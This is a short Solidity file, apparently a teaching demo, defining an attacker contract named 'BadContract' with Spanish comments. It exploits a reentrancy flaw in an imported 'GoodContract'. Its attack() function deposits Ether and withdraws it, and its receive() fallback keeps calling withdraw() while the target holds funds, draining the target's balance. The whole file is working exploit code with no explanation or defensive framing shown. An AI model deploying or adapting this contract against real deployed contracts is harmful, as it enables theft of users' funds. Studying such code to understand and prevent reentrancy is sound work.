// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;
    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }
// Función para recibir Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }
// Inicia el ataque
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}